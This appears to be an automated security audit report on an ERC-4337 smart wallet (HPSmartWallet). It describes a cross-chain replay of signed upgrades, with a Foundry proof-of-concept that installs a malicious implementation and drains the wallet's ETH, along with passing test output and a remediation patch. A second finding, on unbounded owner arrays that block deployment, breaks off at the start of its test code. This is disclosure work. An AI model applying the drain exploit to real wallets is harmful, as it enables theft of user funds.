# Audited by [V12](https://v12.sh/)

The only autonomous auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

# Replayable upgrades trust address only
**#85734**
- Severity: High
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPSmartWallet.sol` (4 locations)
#### Lines 216-242 — _Replayable validation replaces the hash with a chain-agnostic hash and only checks `newImplementation.code.length` for upgrade calls._

```
    function validateUserOp(UserOperation06 calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)
        external
        virtual
        onlyEntryPoint
        payPrefund(missingAccountFunds)
        returns (uint256 validationData)
    {
        uint256 key = userOp.nonce >> 64;

        if (bytes4(userOp.callData) == this.executeWithoutChainIdValidation.selector) {
            userOpHash = getUserOpHashWithoutChainId(userOp);
            if (key != REPLAYABLE_NONCE_KEY) {
                revert InvalidNonceKey(key);
            }

            bytes[] memory calls = abi.decode(userOp.callData[4:], (bytes[]));
            for (uint256 i; i < calls.length; i++) {
                bytes memory callData = calls[i];
                bytes4 selector = bytes4(callData);

                if (selector == UUPSUpgradeable.upgradeToAndCall.selector) {
                    address newImplementation;
                    assembly ("memory-safe") {
                        newImplementation := mload(add(callData, 36))
                    }
                    if (newImplementation.code.length == 0) revert InvalidImplementation(newImplementation);
                }
```

⋯
#### Lines 257-266 — _Replayable execution self-calls each allowlisted payload._

```
    function executeWithoutChainIdValidation(bytes[] calldata calls) external payable virtual onlyEntryPoint {
        for (uint256 i; i < calls.length; i++) {
            bytes calldata call = calls[i];
            bytes4 selector = bytes4(call);
            if (!canSkipChainIdValidation(selector)) {
                revert SelectorNotAllowed(selector);
            }

            _call(address(this), 0, call);
        }
```

⋯
#### Lines 288-305 — _The replayable hash omits chain id and the allowlist includes `upgradeToAndCall`._

```
    function getUserOpHashWithoutChainId(UserOperation06 calldata userOp) public view virtual returns (bytes32) {
        return keccak256(abi.encode(UserOperation06Hash.hash(userOp), entryPoint()));
    }

    function implementation() public view returns (address $) {
        assembly ("memory-safe") {
            $ := sload(_ERC1967_IMPLEMENTATION_SLOT)
        }
    }

    function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
        if (
            functionSelector == MultiOwnable.addOwnerPublicKey.selector
                || functionSelector == MultiOwnable.addOwnerAddress.selector
                || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
                || functionSelector == UUPSUpgradeable.upgradeToAndCall.selector
        ) {
            return true;
```

⋯
#### Line 388 — _Upgrade authorization is owner-based; in the replayable path the wallet self-call satisfies this via `msg.sender == address(this)`._

```
    function _authorizeUpgrade(address) internal view virtual override(UUPSUpgradeable) onlyOwner { }
```

### `contracts/src/wallets/base/MultiOwnable.sol`
#### Lines 134-140 — _Self-calls are treated as owner-authorized calls._

```
    function _checkOwner() internal view virtual {
        if (isOwnerAddress(msg.sender) || (msg.sender == address(this))) {
            return;
        }

        revert Unauthorized();
    }
```

### `contracts/lib/solady/src/utils/UUPSUpgradeable.sol`
#### Lines 69-105 — _The inherited UUPS function writes the supplied implementation and delegatecalls arbitrary upgrade data after authorization._

```
    function upgradeToAndCall(address newImplementation, bytes calldata data)
        public
        payable
        virtual
        onlyProxy
    {
        _authorizeUpgrade(newImplementation);
        /// @solidity memory-safe-assembly
        assembly {
            newImplementation := shr(96, shl(96, newImplementation)) // Clears upper 96 bits.
            mstore(0x00, returndatasize())
            mstore(0x01, 0x52d1902d) // `proxiableUUID()`.
            let s := _ERC1967_IMPLEMENTATION_SLOT
            // Check if `newImplementation` implements `proxiableUUID` correctly.
            if iszero(eq(mload(staticcall(gas(), newImplementation, 0x1d, 0x04, 0x01, 0x20)), s)) {
                mstore(0x01, 0x55299b49) // `UpgradeFailed()`.
                revert(0x1d, 0x04)
            }
            // Emit the {Upgraded} event.
            log2(codesize(), 0x00, _UPGRADED_EVENT_SIGNATURE, newImplementation)
            sstore(s, newImplementation) // Updates the implementation.

            // Perform a delegatecall to `newImplementation` if `data` is non-empty.
            if data.length {
                // Forwards the `data` to `newImplementation` via delegatecall.
                let m := mload(0x40)
                calldatacopy(m, data.offset, data.length)
                if iszero(
                    delegatecall(gas(), newImplementation, m, data.length, codesize(), 0x00)
                ) {
                    // Bubble up the revert if the call reverts.
                    returndatacopy(m, 0x00, returndatasize())
                    revert(m, returndatasize())
                }
            }
        }
    }
```

## Description

The replay-tolerant ERC-4337 path allows `UUPSUpgradeable.upgradeToAndCall` to be authorized with a hash that deliberately omits `block.chainid`. During validation, `HPSmartWallet` rewrites the signed hash to `getUserOpHashWithoutChainId()` for `executeWithoutChainIdValidation`, then only checks that the upgrade target has some deployed code when the inner selector is `upgradeToAndCall`. The execution path later self-calls the wallet, and `canSkipChainIdValidation()` explicitly permits the upgrade selector, so the wallet can install whatever implementation address was included in the replayable operation. Because the signed payload authenticates an address but not the implementation runtime code or code hash on each destination chain, the same owner-signed upgrade can install different code at the same address on another chain. An attacker who arranges a benign implementation at that address on the source chain and malicious UUPS-compatible code at the same address on a replay target can replay the signed operation and take over the wallet implementation there.

## Root cause

`executeWithoutChainIdValidation()` allows replayable `upgradeToAndCall` operations while `validateUserOp()` authenticates only the implementation address and `code.length`. The replayable hash omits both chain identity and implementation code identity, so upgrade authority is portable to chains where the same address is not the same trusted implementation.

## Impact

The attacker can upgrade the wallet on the replay target chain to malicious code and then execute arbitrary asset transfers from that wallet. Funds and approvals held by the wallet on the affected chain become controllable by the malicious implementation after the replayed upgrade succeeds.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";
import { UUPSUpgradeable } from "@solady/utils/UUPSUpgradeable.sol";

import { HPSmartWallet } from "@src/wallets/HPSmartWallet.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

contract BenignWalletImplementation is HPSmartWallet {
    constructor(address addressProvider_) HPSmartWallet(addressProvider_) { }

    function version() external pure returns (uint256) {
        return 2;
    }
}

contract MaliciousWalletImplementation is HPSmartWallet {
    constructor(address addressProvider_) HPSmartWallet(addressProvider_) { }

    function sweep(address payable recipient) external {
        (bool ok,) = recipient.call{ value: address(this).balance }("");
        require(ok, "sweep failed");
    }
}

contract ReplayableUpgradeCrossChainPoCTest is WalletTestBase {
    HPSmartWallet internal wallet;

    function setUp() public override {
        super.setUp();
        wallet = _createWallet(ownerEOA, 0);
    }

    function test_replayableUpgrade_replaysAcrossChainIdsAndInstallsDifferentCodeAtSameAddress() public {
        vm.deal(address(wallet), 10 ether);

        uint256 commonSnapshot = vm.snapshot();
        address attackerDeployer = makeAddr("attackerDeployer");

        vm.chainId(1);
        vm.prank(attackerDeployer);
        BenignWalletImplementation benignImpl = new BenignWalletImplementation(address(provider));

        address sharedImplementationAddress = address(benignImpl);
        bytes32 benignCodehash = _codehash(sharedImplementationAddress);

        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, sharedImplementationAddress, "");

        UserOperation06 memory op = _baseUserOp(address(wallet), wallet.REPLAYABLE_NONCE_KEY() << 64);
        op.callData = abi.encodeCall(HPSmartWallet.executeWithoutChainIdValidation, (calls));

        bytes32 sourceDigest = wallet.getUserOpHashWithoutChainId(op);
        op.signature = _eoaSignature(ownerPk, sourceDigest, 0);

        vm.prank(entryPointAddr);
        uint256 sourceValidation = wallet.validateUserOp(op, keccak256("ignored-source-hash"), 0);
        assertEq(sourceValidation, 0, "source-chain validation failed");

        assertTrue(vm.revertTo(commonSnapshot), "snapshot restore failed");

        vm.chainId(2);
        vm.prank(attackerDeployer);
        MaliciousWalletImplementation maliciousImpl = new MaliciousWalletImplementation(address(provider));

        assertEq(address(maliciousImpl), sharedImplementationAddress, "implementation address changed across chains");

        bytes32 maliciousCodehash = _codehash(address(maliciousImpl));
        assertTrue(maliciousCodehash != benignCodehash, "runtime code did not change");

        bytes32 targetDigest = wallet.getUserOpHashWithoutChainId(op);
        assertEq(targetDigest, sourceDigest, "replayable digest changed across chain ids");

        vm.prank(entryPointAddr);
        uint256 targetValidation = wallet.validateUserOp(op, keccak256("ignored-target-hash"), 0);
        assertEq(targetValidation, 0, "target-chain replay validation failed");

        vm.prank(entryPointAddr);
        wallet.executeWithoutChainIdValidation(calls);

        assertEq(wallet.implementation(), sharedImplementationAddress, "wallet did not upgrade to replayed implementation");

        address attacker = makeAddr("attacker");
        uint256 walletBalanceBefore = address(wallet).balance;

        vm.prank(attacker);
        MaliciousWalletImplementation(payable(address(wallet))).sweep(payable(attacker));

        assertEq(attacker.balance, walletBalanceBefore, "attacker failed to drain wallet after replayed upgrade");
        assertEq(address(wallet).balance, 0, "wallet retained funds after drain");
    }

    function _codehash(address target) internal view returns (bytes32 hash) {
        assembly ("memory-safe") {
            hash := extcodehash(target)
        }
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd /repo/contracts && rm -rf out cache && forge build
```

### Output

```
[output truncated: 27 lines & 1.119140625 KB skipped]

Ran 1 test for test/wallets/WalletHarnessPlaceholder.t.sol:ReplayableUpgradeCrossChainPoCTest
[PASS] test_replayableUpgrade_replaysAcrossChainIdsAndInstallsDifferentCodeAtSameAddress() (gas: 5623825)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.14ms (1.19ms CPU time)

Ran 1 test suite in 9.79ms (3.14ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  revertTo(uint256): replaced by `revertToState`
  snapshot(): replaced by `snapshotState`
```

### Considerations

PoC is a Foundry unit harness that simulates two chains by branching local state with snapshot/revert and changing `vm.chainId`, then redeploying different implementations from the same deployer+nonce to the same address. It demonstrates the replayable signed upgrade, successful target-chain installation of different code at the signed address, and post-upgrade draining via public entry points, but it does not connect to live external chains or a full EntryPoint bundle pipeline.

## Remediation

### Explanation

Removed UUPS upgradeToAndCall from the replayable executeWithoutChainIdValidation allowlist so upgrades must use the normal chain-bound execute path. This closes the cross-chain replay root cause without changing replayable owner-management behavior.

### Patch

```diff
diff --git a/contracts/src/wallets/HPSmartWallet.sol b/contracts/src/wallets/HPSmartWallet.sol
--- a/contracts/src/wallets/HPSmartWallet.sol
+++ b/contracts/src/wallets/HPSmartWallet.sol
@@ -1,393 +1,392 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { IAccount06 } from "@account-abstraction/legacy/v06/IAccount06.sol";
 import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";
 import { Receiver } from "@solady/accounts/Receiver.sol";
 import { SignatureCheckerLib } from "@solady/utils/SignatureCheckerLib.sol";
 import { UUPSUpgradeable } from "@solady/utils/UUPSUpgradeable.sol";
 import { WebAuthn } from "@webauthn-sol/WebAuthn.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { DefaultCrypto, DefaultStablecoin } from "./types/HPWalletTypes.sol";
 import { MultiOwnable } from "./base/MultiOwnable.sol";
 import { UserOperation06Hash } from "./base/UserOperation06Hash.sol";
 import { WalletERC1271 } from "./base/WalletERC1271.sol";
 
 /// @notice Storage layout used by this contract.
 /// @custom:storage-location erc7201:highpotential.storage.WalletSettings
 struct WalletSettingsStorage {
     DefaultCrypto defaultCrypto;
     DefaultStablecoin defaultStablecoin;
 }
 
 /// @notice User-specific manager contracts, co-located in the wallet (authoritative; no central registry).
 /// @dev Read by the frontend in a single `eth_call` via `accountSet()`. Populated by an owner post-creation
 ///      (or by a future factory orchestration self-call once PositionManager/VaultManager are designed); not an
 ///      `initialize` arg, so it cannot influence the counterfactual address.
 /// @custom:storage-location erc7201:highpotential.storage.AccountSet
 struct AccountSetStorage {
     address positionManager;
     address vaultManager;
 }
 
 /// @title HPSmartWallet
 /// @notice ERC-4337 v0.6 smart account modeled on Coinbase Smart Wallet: multi-owner (EOA + passkey), ERC-1271, UUPS.
 /// @dev Extends the base account with user settings (DefaultCrypto / DefaultStablecoin) and the user's AccountSet
 ///      (PositionManager / VaultManager) in ERC-7201 namespaced storage, plus AddressProvider-based token
 ///      resolution. Owner -> wallet discovery is handled off-chain by Turnkey; legitimacy is asserted by the
 ///      factory's `isHPWallet` flag. EntryPoint v0.6 default below; override `entryPoint()` per-chain if needed.
 contract HPSmartWallet is WalletERC1271, IAccount06, MultiOwnable, UUPSUpgradeable, Receiver, AddressBook {
     struct SignatureWrapper {
         uint256 ownerIndex;
         bytes signatureData;
     }
 
     struct Call {
         address target;
         uint256 value;
         bytes data;
     }
 
     /// @dev Upper 192 bits of `UserOperation.nonce` for `executeWithoutChainIdValidation` (Coinbase uses Base chain id).
     uint256 public constant REPLAYABLE_NONCE_KEY = 8453;
 
     /// @dev keccak256(abi.encode(uint256(keccak256("highpotential.storage.WalletSettings")) - 1)) & ~bytes32(uint256(0xff))
     bytes32 private constant _WALLET_SETTINGS_STORAGE_LOCATION =
         0xde9abc39f8ba6496385be7b2e06f782787ee07b9096c13bc6574d61d02346900;
     /// @dev keccak256(abi.encode(uint256(keccak256("highpotential.storage.AccountSet")) - 1)) & ~bytes32(uint256(0xff))
     bytes32 private constant _ACCOUNT_SET_STORAGE_LOCATION =
         0xd2d10004138f2882870e52b168c3ad025ba8daea9d7df73d3caa86e3d34a7b00;
 
     event DefaultCryptoUpdated(DefaultCrypto indexed previous, DefaultCrypto indexed current);
     event DefaultStablecoinUpdated(DefaultStablecoin indexed previous, DefaultStablecoin indexed current);
     event AccountSetUpdated(address indexed positionManager, address indexed vaultManager);
 
     error Initialized();
     error SelectorNotAllowed(bytes4 selector);
     error InvalidNonceKey(uint256 key);
     error InvalidImplementation(address implementation);
 
     modifier onlyEntryPoint() {
         if (msg.sender != entryPoint()) {
             revert Unauthorized();
         }
 
         _;
     }
 
     modifier onlyEntryPointOrOwner() {
         if (msg.sender != entryPoint()) {
             _checkOwner();
         }
 
         _;
     }
 
     modifier payPrefund(uint256 missingAccountFunds) {
         _;
 
         assembly ("memory-safe") {
             if missingAccountFunds {
                 pop(call(gas(), caller(), missingAccountFunds, codesize(), 0x00, codesize(), 0x00))
             }
         }
     }
 
     constructor(address addressProvider_) AddressBook(addressProvider_) {
         // Lock this implementation against direct initialization. Done without storing an `address(0)` sentinel
         // owner, which would now be rejected as uncontrollable; proxies retain fresh storage and initialize.
         _lockImplementation();
     }
 
     function initialize(bytes[] calldata owners) external payable virtual {
         if (nextOwnerIndex() != 0) {
             revert Initialized();
         }
 
         _initializeOwners(owners);
 
         // Seed user settings to platform defaults (mirrors the UI defaults); the user can update them post-creation.
         // Deliberately not initializer args: the counterfactual address must depend only on owners + nonce, and a
         // front-runner of `createAccount` must not be able to influence wallet state.
         // Previous values are the enum zero values (BTC / TGBP) — the actual pre-init state — so off-chain
         // indexers reconstructing preference history see the correct transition.
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         $.defaultCrypto = DefaultCrypto.ETH;
         $.defaultStablecoin = DefaultStablecoin.TGBP;
         emit DefaultCryptoUpdated(DefaultCrypto.BTC, DefaultCrypto.ETH);
         emit DefaultStablecoinUpdated(DefaultStablecoin.TGBP, DefaultStablecoin.TGBP);
     }
 
     // --------------------------------------------
     //  User settings
     // --------------------------------------------
 
     /// @notice Updates the preferred crypto asset. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultCrypto(DefaultCrypto newDefaultCrypto) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultCrypto previous = $.defaultCrypto;
         $.defaultCrypto = newDefaultCrypto;
         emit DefaultCryptoUpdated(previous, newDefaultCrypto);
     }
 
     /// @notice Updates the preferred stablecoin. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultStablecoin(DefaultStablecoin newDefaultStablecoin) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultStablecoin previous = $.defaultStablecoin;
         $.defaultStablecoin = newDefaultStablecoin;
         emit DefaultStablecoinUpdated(previous, newDefaultStablecoin);
     }
 
     function defaultCrypto() public view virtual returns (DefaultCrypto) {
         return _getWalletSettingsStorage().defaultCrypto;
     }
 
     function defaultStablecoin() public view virtual returns (DefaultStablecoin) {
         return _getWalletSettingsStorage().defaultStablecoin;
     }
 
     /// @notice Both settings in a single call (one cheap read for the UI).
     function walletSettings() external view virtual returns (DefaultCrypto, DefaultStablecoin) {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         return ($.defaultCrypto, $.defaultStablecoin);
     }
 
     /// @notice Token address for the preferred crypto, resolved via `AddressProvider`.
     /// @dev Reverts `AddressNotFound` while the key is unset (e.g. SETH before its wrapper is deployed).
     function defaultCryptoAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_cryptoKeyName(defaultCrypto())));
     }
 
     /// @notice Token address for the preferred stablecoin, resolved via `AddressProvider`.
     function defaultStablecoinAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_stablecoinKeyName(defaultStablecoin())));
     }
 
     function _cryptoKeyName(DefaultCrypto crypto) internal pure returns (string memory) {
         if (crypto == DefaultCrypto.BTC) return "CBBTC";
         if (crypto == DefaultCrypto.ETH) return "WETH";
         return "SETH";
     }
 
     function _stablecoinKeyName(DefaultStablecoin stablecoin) internal pure returns (string memory) {
         if (stablecoin == DefaultStablecoin.TGBP) return "TGBP";
         if (stablecoin == DefaultStablecoin.USDC) return "USDC";
         if (stablecoin == DefaultStablecoin.EURC) return "EURC";
         return "DAI";
     }
 
     function _getWalletSettingsStorage() internal pure returns (WalletSettingsStorage storage $) {
         assembly ("memory-safe") {
             $.slot := _WALLET_SETTINGS_STORAGE_LOCATION
         }
     }
 
     // --------------------------------------------
     //  Account set (user-specific managers)
     // --------------------------------------------
 
     /// @notice The user's PositionManager and VaultManager, in a single cheap read for the UI.
     function accountSet() external view virtual returns (address positionManager, address vaultManager) {
         AccountSetStorage storage $ = _getAccountSetStorage();
         return ($.positionManager, $.vaultManager);
     }
 
     /// @notice Sets the user's manager contracts. Callable by an owner directly or via EntryPoint `execute`
     ///         self-call.
     function setAccountSet(address positionManager, address vaultManager) external virtual onlyOwner {
         AccountSetStorage storage $ = _getAccountSetStorage();
         $.positionManager = positionManager;
         $.vaultManager = vaultManager;
         emit AccountSetUpdated(positionManager, vaultManager);
     }
 
     function _getAccountSetStorage() internal pure returns (AccountSetStorage storage $) {
         assembly ("memory-safe") {
             $.slot := _ACCOUNT_SET_STORAGE_LOCATION
         }
     }
 
     // --------------------------------------------
     //  ERC-4337
     // --------------------------------------------
 
     function validateUserOp(UserOperation06 calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)
         external
         virtual
         onlyEntryPoint
         payPrefund(missingAccountFunds)
         returns (uint256 validationData)
     {
         uint256 key = userOp.nonce >> 64;
 
         if (bytes4(userOp.callData) == this.executeWithoutChainIdValidation.selector) {
             userOpHash = getUserOpHashWithoutChainId(userOp);
             if (key != REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
 
             bytes[] memory calls = abi.decode(userOp.callData[4:], (bytes[]));
             for (uint256 i; i < calls.length; i++) {
                 bytes memory callData = calls[i];
                 bytes4 selector = bytes4(callData);
 
                 if (selector == UUPSUpgradeable.upgradeToAndCall.selector) {
                     address newImplementation;
                     assembly ("memory-safe") {
                         newImplementation := mload(add(callData, 36))
                     }
                     if (newImplementation.code.length == 0) revert InvalidImplementation(newImplementation);
                 }
             }
         } else {
             if (key == REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
         }
 
         if (_isValidSignature(userOpHash, userOp.signature)) {
             return 0;
         }
 
         return 1;
     }
 
     function executeWithoutChainIdValidation(bytes[] calldata calls) external payable virtual onlyEntryPoint {
         for (uint256 i; i < calls.length; i++) {
             bytes calldata call = calls[i];
             bytes4 selector = bytes4(call);
             if (!canSkipChainIdValidation(selector)) {
                 revert SelectorNotAllowed(selector);
             }
 
             _call(address(this), 0, call);
         }
     }
 
     function execute(address target, uint256 value, bytes calldata data)
         external
         payable
         virtual
         onlyEntryPointOrOwner
     {
         _call(target, value, data);
     }
 
     function executeBatch(Call[] calldata calls) external payable virtual onlyEntryPointOrOwner {
         for (uint256 i; i < calls.length; i++) {
             _call(calls[i].target, calls[i].value, calls[i].data);
         }
     }
 
     function entryPoint() public view virtual returns (address) {
         return 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
     }
 
     function getUserOpHashWithoutChainId(UserOperation06 calldata userOp) public view virtual returns (bytes32) {
         return keccak256(abi.encode(UserOperation06Hash.hash(userOp), entryPoint()));
     }
 
     function implementation() public view returns (address $) {
         assembly ("memory-safe") {
             $ := sload(_ERC1967_IMPLEMENTATION_SLOT)
         }
     }
 
     function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
         if (
             functionSelector == MultiOwnable.addOwnerPublicKey.selector
                 || functionSelector == MultiOwnable.addOwnerAddress.selector
                 || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
-                || functionSelector == UUPSUpgradeable.upgradeToAndCall.selector
         ) {
             return true;
         }
         return false;
     }
 
     function _call(address target, uint256 value, bytes memory data) internal {
         (bool success, bytes memory result) = target.call{ value: value }(data);
         if (!success) {
             assembly ("memory-safe") {
                 revert(add(result, 32), mload(result))
             }
         }
     }
 
     /// @notice ERC-1271 verification that always returns a selector, never reverts.
     /// @dev Routes signature parsing through a self-`staticcall` so malformed signature blobs, stale/out-of-range
     ///      owner indices, and malformed WebAuthn payloads surface as `0xffffffff` rather than a revert, honoring
     ///      the ERC-1271 contract that failure is reported via the return value.
     function isValidSignature(bytes32 hash, bytes calldata signature)
         public
         view
         virtual
         override
         returns (bytes4)
     {
         try this.isValidSignatureExternal(replaySafeHash(hash), signature) returns (bool ok) {
             return ok ? bytes4(0x1626ba7e) : bytes4(0xffffffff);
         } catch {
             return 0xffffffff;
         }
     }
 
     /// @notice Self-only external wrapper enabling the `try/catch` in `isValidSignature`.
     /// @dev `replaySafeHash` is already applied by the caller; do not re-wrap.
     function isValidSignatureExternal(bytes32 replaySafeHash_, bytes calldata signature)
         external
         view
         virtual
         returns (bool)
     {
         if (msg.sender != address(this)) revert Unauthorized();
         return _isValidSignature(replaySafeHash_, signature);
     }
 
     function _isValidSignature(bytes32 hash, bytes calldata signature)
         internal
         view
         virtual
         override
         returns (bool)
     {
         SignatureWrapper memory sigWrapper = abi.decode(signature, (SignatureWrapper));
         bytes memory ownerBytes = ownerAtIndex(sigWrapper.ownerIndex);
 
         // Out-of-range or removed owner index: report failure rather than reverting.
         if (ownerBytes.length == 0) {
             return false;
         }
 
         if (ownerBytes.length == 32) {
             if (uint256(bytes32(ownerBytes)) > type(uint160).max) {
                 revert InvalidEthereumAddressOwner(ownerBytes);
             }
 
             address ownerAddr;
             assembly ("memory-safe") {
                 ownerAddr := mload(add(ownerBytes, 32))
             }
 
             return SignatureCheckerLib.isValidSignatureNow(ownerAddr, hash, sigWrapper.signatureData);
         }
 
         if (ownerBytes.length == 64) {
             (uint256 x, uint256 y) = abi.decode(ownerBytes, (uint256, uint256));
 
             WebAuthn.WebAuthnAuth memory auth = abi.decode(sigWrapper.signatureData, (WebAuthn.WebAuthnAuth));
 
             return WebAuthn.verify({ challenge: abi.encode(hash), requireUV: false, webAuthnAuth: auth, x: x, y: y });
         }
 
         revert InvalidOwnerBytesLength(ownerBytes);
     }
 
     function _authorizeUpgrade(address) internal view virtual override(UUPSUpgradeable) onlyOwner { }
 
     function _domainNameAndVersion() internal pure override(WalletERC1271) returns (string memory, string memory) {
         return ("HighPotential Smart Wallet", "1");
     }
 }
```

### Affected files
- `contracts/src/wallets/HPSmartWallet.sol`

### Validation output

```
[output truncated: 36 lines & 1.654296875 KB skipped]
[FAIL: SelectorNotAllowed(0x4f1ef286)] test_replayableUpgrade_replaysAcrossChainIdsAndInstallsDifferentCodeAtSameAddress() (gas: 5567040)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  snapshot(): replaced by `snapshotState`
  revertTo(uint256): replaced by `revertToState`
```

---

# Unbounded Owners Brick Deployment
**#85735**
- Severity: High
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPSmartWalletFactory.sol` (3 locations)
#### Lines 44-61 — _`createAccount` accepts the unbounded owner array, deploys the deterministic proxy, initializes it, and records the wallet only if initialization succeeds._

```
    function createAccount(bytes[] calldata owners, uint256 nonce)
        external
        payable
        virtual
        returns (HPSmartWallet account)
    {
        _validateOwners(owners);

        (bool alreadyDeployed, address accountAddress) =
            LibClone.createDeterministicERC1967(msg.value, implementation, _getSalt(owners, nonce));

        account = HPSmartWallet(payable(accountAddress));

        if (!alreadyDeployed) {
            account.initialize(owners);
            isHPWallet[accountAddress] = true;
            _wallets.push(accountAddress);
            emit AccountCreated(accountAddress, owners, nonce);
```

⋯
#### Lines 65-70 — _`getAddress` advertises the counterfactual address after the same syntactic validation, without checking deployment gas feasibility._

```
    /// @notice Counterfactual wallet address for `owners` + `nonce` (used by the client and Turnkey config).
    /// @dev Validates `owners` with the same rules as deployment, so a predicted address is always deployable
    ///      (no advertising of addresses that `createAccount` would reject, which could trap pre-funded ETH).
    function getAddress(bytes[] calldata owners, uint256 nonce) external view returns (address) {
        _validateOwners(owners);
        return LibClone.predictDeterministicAddress(initCodeHash(), _getSalt(owners, nonce), address(this));
```

⋯
#### Lines 116-130 — _Owner validation has no count cap and the salt commits to the complete owner array._

```
    function _validateOwners(bytes[] calldata owners) internal pure {
        if (owners.length == 0) revert OwnerRequired();

        for (uint256 i; i < owners.length; ++i) {
            OwnerValidation.validate(owners[i]);

            bytes32 ownerHash = keccak256(owners[i]);
            for (uint256 j; j < i; ++j) {
                if (ownerHash == keccak256(owners[j])) revert MultiOwnable.AlreadyOwner(owners[i]);
            }
        }
    }

    function _getSalt(bytes[] calldata owners, uint256 nonce) internal pure returns (bytes32) {
        return keccak256(abi.encode(owners, nonce));
```

### `contracts/src/wallets/base/MultiOwnable.sol`
#### Lines 90-110 — _Wallet initialization iterates over and stores every owner, making deployment cost grow with the unbounded array._

```
    function _initializeOwners(bytes[] memory owners) internal virtual {
        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        uint256 nextOwnerIndex_ = $.nextOwnerIndex;
        for (uint256 i; i < owners.length; i++) {
            _addOwnerAtIndex(owners[i], nextOwnerIndex_++);
        }
        $.nextOwnerIndex = nextOwnerIndex_;
    }

    /// @dev Single chokepoint for all owner writes (initialize / addOwnerAddress / addOwnerPublicKey). Rejects
    ///      uncontrollable owners so the stored set always equals the set of reachable controllers.
    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual {
        OwnerValidation.validate(owner);
        if (keccak256(owner) == keccak256(abi.encode(address(this)))) revert SelfOwnerNotAllowed();
        if (isOwnerBytes(owner)) revert AlreadyOwner(owner);

        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        $.isOwner[owner] = true;
        $.ownerAtIndex[index] = owner;

        emit AddOwner(index, owner);
```

### `contracts/src/wallets/HPPaymaster.sol`
#### Lines 98-108 — _Paymaster gas credit can be funded for a counterfactual wallet before deployment._

```
    /// @notice Credits `wallet` with `msg.value` of gas allowance and moves the ETH into the EntryPoint deposit.
    /// @dev Callable by anyone (treasury script, deposit router, or the user). `wallet` may be a counterfactual
    ///      address — credits can be funded before the wallet is deployed.
    function depositFor(address wallet) external payable {
        if (wallet == address(0)) revert ZeroWallet();
        if (msg.value == 0) revert ZeroDeposit();

        gasCredit[wallet] += msg.value;
        totalGasCredit += msg.value;

        entryPoint.depositTo{ value: msg.value }(address(this));
```

### `contracts/src/wallets/HPDepositRouter.sol`
#### Lines 87-103 — _Native deposits are explicitly forwarded to counterfactual wallet addresses before deployment._

```
    /// @notice Native ETH deposit: skim funds gas credit directly, remainder forwarded to `wallet`.
    /// @dev `wallet` may be a counterfactual HPSmartWallet address (both legs work pre-deployment).
    function depositNative(address wallet) external payable {
        if (wallet == address(0)) revert ZeroWallet();
        if (msg.value == 0) revert ZeroAmount();

        uint256 skim = (msg.value * skimBps) / BPS_DENOMINATOR;
        uint256 net = msg.value - skim;

        if (skim != 0) {
            _paymaster().depositFor{ value: skim }(wallet);
        }

        (bool ok,) = wallet.call{ value: net }("");
        if (!ok) revert EthTransferFailed();

        emit DepositProcessed(wallet, address(0), msg.value, skim, net);
```

## Description

`getAddress` accepts any non-empty, unique, individually valid `owners` array and returns a CREATE2 address without bounding the number of owners to a deployment-safe size. The full `owners` array is part of the salt, so the exact same oversized array must be used to deploy the wallet at the advertised address. `createAccount` then repeats validation and calls `initialize`, while `MultiOwnable._initializeOwners` iterates over every owner and writes each owner into storage. Because the owner count is attacker-controlled and unbounded, a valid owner set can be large enough that prediction is possible off-chain but deployment cannot fit within the chain gas limit. Counterfactual funding paths can send ETH, ERC-20 principal, or paymaster gas credit to that address before code exists, and a smaller owner list cannot recover the same address.

## Root cause

`HPSmartWalletFactory` treats syntactic owner validity as sufficient for counterfactual safety, but it does not cap `owners.length` or otherwise prove that the exact salt input can be initialized within the gas limit. The salt binds the unbounded array, making oversized valid inputs unrecoverable after prefunding.

## Impact

Deposits sent to the advertised counterfactual address become inaccessible because no initialized wallet can be created there under the gas limit. An attacker can supply a pathological owner list to any integration that pre-funds predicted wallets, causing the victim’s principal or gas credit to be stranded at an address with no executable account.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { HPPaymaster } from "@src/wallets/HPPaymaster.sol";
